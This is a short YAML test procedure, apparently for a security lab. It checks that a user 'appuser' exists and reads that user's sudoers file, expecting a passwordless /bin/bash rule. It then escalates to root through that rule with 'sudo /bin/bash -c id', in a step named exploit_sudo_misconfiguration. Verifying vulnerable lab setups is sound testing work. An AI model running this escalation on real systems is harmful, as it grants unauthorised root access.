@@ -1,0 +1,29 @@
+procedure:
+- action:
+    command: id appuser
+    type: exec_target
+  expect:
+    stdout_contains: appuser
+  outputs: {}
+  session: null
+  step_id: verify_appuser_exists
+  timeout: 10
+- action:
+    command: cat /etc/sudoers.d/appuser
+    type: exec_target
+  expect:
+    stdout_contains: 'NOPASSWD: /bin/bash'
+  outputs: {}
+  session: null
+  step_id: check_sudoers_rule
+  timeout: 10
+- action:
+    command: su -s /bin/bash appuser -c 'sudo /bin/bash -c id'
+    type: exec_target
+  expect:
+    stdout_contains: uid=0(root)
+  outputs: {}
+  session: null
+  step_id: exploit_sudo_misconfiguration
+  timeout: 10
+sessions: []
